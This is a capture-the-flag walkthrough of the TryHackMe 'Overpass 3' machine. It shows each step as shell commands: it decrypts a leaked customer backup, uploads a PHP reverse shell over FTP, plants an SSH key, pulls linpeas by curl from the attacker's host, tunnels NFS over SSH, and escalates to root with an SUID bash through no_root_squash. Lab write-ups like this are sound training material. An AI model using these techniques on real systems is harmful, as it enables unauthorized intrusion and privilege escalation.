# TryHackMe Overpass 3 hosting WriteUp
Machine IP = 10.82.158.10  

At first, I make a rust scan to find open ports:  

```bash  
rustscan -a 192.16.13.53
```  
Yeah, we defined that there are three ports:  
--> 21,22,80  
I searched the web-page and there were some usernames a hint on source code but nothing else. So I made a directory scanning by the help of **FFUF**.  
```bash
ffuf -u 'http://10.82.158.10/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -ic
```
It found some directories but there is only one necessary file for us: ***backup***  
I contains a ".zip" file. I clicked on it and it automatically installed to my device. Let's look what is inside it.  
```bash
unzip backup.zip  
|CustomerDetails.xlsx.gpg  
|priv.key  
gpg --import priv.key  
gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx  
```  
I opened this ".xlsx" file on browser by the help of online excel. It gave me three users and their credentials like username and password. As you can remember, we have an open ftp port. I tried to access with these user's name and password. Only the user "paradox" became successful for ftp connection.  

----  
  After successfully logging into the FTP server, the first idea is to upload a PHP reverse shell to gain remote access. I used the "reverse shell php" from pentestmonkey.  
```bash
ftp> put reverseshell.php
```
I opened a nc connection on my terminal by writing **"rlwrap nc -nvlp 4444"** and access to this url to get shell:
```bash
| http://10.82.158.10/reverseshell.php
```  
I am "apache" right now. I need to find web flag at first. So, I used this command to find its location:  
```bash  
find / -type f -name *.flag 2>/dev/null
```
The result is **"/usr/share/httpd/web.flag"**. I got it. Lets try access to other users. I tried it by ssh but none of them worked. So I decided to check su command for it. And again, we can access "paradox" user. I need better interface so i used "python3 -c 'import pty;pty.spawn("/bin/bash")'" command for it. A reverse shell is often unstable. To establish a persistent and stable SSH session, we generate SSH key pairs on our local machine and transfer the public key to the target. I use this command on my terminal:
```bash
sss-keygen
```
I copied the public key's content and paste it on "/home/paradox/.ssh/authorized_keys". After this I can easily connect to this user over ssh. 
```bash
ssh -i id_ed25519 paradox@10.82.158.10
```
I used the private key in there.  
----
I didn't find any important thing on this user and I also cannot access the files of other users so I used linpeas.sh file in there. I forwarded it from my terminal "python3 http.server 8000" to there "curl http://192.168.167.246/linpeas.sh".  
When I look at the output, I noticed a hint on there:
```bash
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```
It is a way that will help us on Privilege Esc step.  
What is NFS? It stands for Network File System. It is a protocol that allows files and directories to be shared across network. It enables remote systems to access files as if they were stored locally. But there is so much vulnerability right now.
1. /home/james -> This is the directory being shared over NFS.  
2. * -> The share is accessible from any IP address, making it highly insecure.  
3. rw -> Read & write access is granted, meaning remote users can modify files.  
4. fsid=0 -> This marks the directory as the root of the NFS export (important for mounting).  
5. sync -> Ensures all writes are committed to disk before acknowledgment (avoids data corruption).  
6. no_root_squash -> Disables root squashing, allowing the root user from a remote system to be treated as root on the target machine as well. Huge security risk!
----  
By default, NFS operates on port 2049, but I wanted to be sure. So i used this command:  
```bash
rpcinfo -p
```
I tried to connect it but it wasn't accessible externally, it is only accessible from within the target machine - localhost. So, I need to create an SSH tunnel to forward the local NFS port (2049) to our machine. SSH tunneling allows us to securely forward network traffic from a remote machine to our local machine. This technique is useful when services are only accessible locally on the target but we need to interact with them remotely. To establish a tunnel we run this command on our own terminal:
```bash
ssh -L 1111:127.0.0.1:2049 paradox@10.82.158.10 -i id_ed25519
```
Yeah after connecting by this command, we can mount the shared folder to our system. Mount by this command on my own terminal again. Then, you can check if it is successful by opening your folder like: ls -la /home/faridd/Downloads/overpass3  
```bash
sudo mount -t nfs -o port=1111,nolock 127.0.0.1:/ /home/faridd/Downloads/overpass3
```
1. sudo mount -> Runs the mount command with root privileges.
2. -o port=1111 -> Specifies that we are using our forwarded port 1111 instead of the default NFS port (2049).
3. -t nfs -> Defines the filesystem type as NFS.
4. 127.0.0.1:/home/james -> Indicates that we are mounting the /home/james directory from the remote system (now accessible via 127.0.0.1).
5. /home/faridd/Downloads/overpass3 -> The local directory where we mount the remote NFS share.

Then, I access my local directory:
```bash
cd /home/faridd/Downloads/overpass3
```
I got the user flag from there. Now, i need to be james. There is a RSA key on /home/faridd/Downloads/overpass3/.ssh
----
# PRIVILEGE ESCALATION
In this step, I will use no_root_squash vulnerability to be root. 
1. Our goal is to create a program on the server that, when run by a normal user, gives us root access. We use the SUID (Set User ID) method. We use the server's bash to ensure it is compatible with the server's libraries.
```bash
[james@ip-10-82-158-10 ~]$ cp /bin/bash /home/james/bash
```
2. We set the root permission and SUID permission to this file from our own terminal:
```bash
┌──(faridd㉿Ferid)-[~/Downloads/overpass3/.ssh]
└─$ sudo chown root:root /home/faridd/Downloads/overpass3/bash                    
┌──(faridd㉿Ferid)-[~/Downloads/overpass3/.ssh]
└─$ sudo chmod +s /home/faridd/Downloads/overpass3/bash
```
3. We return to our normal user session (James) and execute our prepared file.
```bash
/home/james/bash -p
```
We are root right now. Yeah after reading the root flag, the CTF finishes.
We learned what is NFS, how to trick the system to connect NFS connection that is closed for externals, how to work with shared folders from our own terminal, improve privilege esc and discovery abilities.





























